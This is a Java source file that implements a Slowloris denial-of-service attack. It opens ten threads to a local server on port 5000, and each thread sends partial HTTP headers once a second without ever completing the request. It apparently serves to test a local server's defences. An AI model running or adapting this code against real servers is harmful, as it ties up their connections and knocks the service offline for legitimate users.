package safety.attacks;

import java.io.OutputStream;
import java.net.Socket;

public class SlowlorisAttack {
    private static final String SERVER_IP = "127.0.0.1";
    private static final int SERVER_PORT = 5000;

    public static void main(String[] args) {
        for (int i = 0; i < 10; i++) { // Simulate 10 slow connections
            new Thread(() -> {
                try (Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                     OutputStream out = socket.getOutputStream()) {
                    String httpRequest = "GET / HTTP/1.1\r\nHost: localhost\r\n";
                    out.write(httpRequest.getBytes());
                    System.out.println("Slowloris Attack started by " + Thread.currentThread().getName());
                    while (true) {
                        Thread.sleep(1000); // Send partial headers every second
                        out.write("X-a: b\r\n".getBytes());
                    }
                } catch (Exception e) {
                    System.out.println("Server blocked the attack!");
                }
            }).start();
        }
    }
}